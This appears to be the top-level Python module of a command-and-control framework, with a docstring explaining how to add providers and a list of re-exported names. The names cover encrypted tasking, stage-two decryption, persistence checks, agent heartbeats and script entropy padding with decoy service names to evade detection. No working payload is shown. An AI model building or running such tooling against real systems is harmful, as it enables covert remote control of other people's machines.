"""
Stratum C2 — Core session framework and provider wizard base.

Layout:
  PART 1 — Session framework
    BaseTransport, TRANSPORT_REGISTRY, SessionProfile, AgentState,
    SessionHistory, Session, SessionManager, crypto utils,
    HeartbeatMonitor, AsyncPoller, send_async
  PART 2 — Deployment wizard base
    BaseConfig, ProviderWizard (Template Method)

To add a new provider:
  1. Create providers/<name>/wizard.py
  2. Define XxxTransport(BaseTransport) and register: TRANSPORT_REGISTRY["name"] = XxxTransport
  3. Define XxxConfig(BaseConfig) and XxxWizard(ProviderWizard)
  4. Implement 4 abstract hooks: make_config, step_auth, step_init_channel, _make_transport()
  5. Override _provider_subs() to inject credential placeholders into generated scripts
  6. Create providers/<name>/transport/ with agent.sh, agent.ps1, stub.sh, stub.ps1
  6. Add XxxWizard to PROVIDERS in providers/all.py
"""

# ── re-export everything from the split modules ───────────────────────────────

from providers._notifications import (
    _log,
    _tl,
    _set_cancel_event,
    _cancelable_run,
    _NotificationHub,
    _CliNotificationHub,
    _hub,
    _n_ok, _n_err, _n_warn, _n_info, _n_output,
    _n_ul_confirmed, _n_heartbeat, _n_agent_dead,
    _n_save_session, _n_persist_updated,
    _save_ul_record,
)

from providers._crypto import (
    _OAEP, _PSS,
    _rsa_oaep_decrypt,
    _gcm_seal, _gcm_open,
    decrypt_stage2,
    deploy_id_from_key,
    build_task,
    encrypt_command,
    decrypt_output,
)

from providers._session import (
    MZ_MARKER,
    HB_REFRESH_INTERVAL,
    DOWNLOADS_DIR,
    _TEMPLATES_DIR,
    RateLimitedError,
    BaseTransport,
    TRANSPORT_REGISTRY,
    _load_creds_file,
    SessionProfile,
    AgentState,
    SessionHistory,
    _sync_persist_check,
    _probe_json_path,
    _infer_persist_status,
    _sync_persist_op,
    _sync_persist_probe,
    _load_persist_probe,
    _restore_state,
    _restore_pending_cmd,
    Session,
    _session_json_name,
    SessionManager,
)

from providers._monitor import (
    _parse_heartbeat,
    _INVALID_EXT_IPS,
    is_valid_ext_ip,
    HeartbeatMonitor,
    _initial_hb_check,
    AsyncPoller,
    send_async,
)

from providers._wizard import (
    _entropy,
    _PAD_SVCNAMES_WIN,
    _PAD_SVCNAMES_NIX,
    _make_pad_block,
    _pad_script_entropy,
    WIN_BLOB_FALLBACK_PATHS,
    BaseConfig,
    _ps1_concat,
    _resolve_stun_ip,
    ProviderWizard,
)
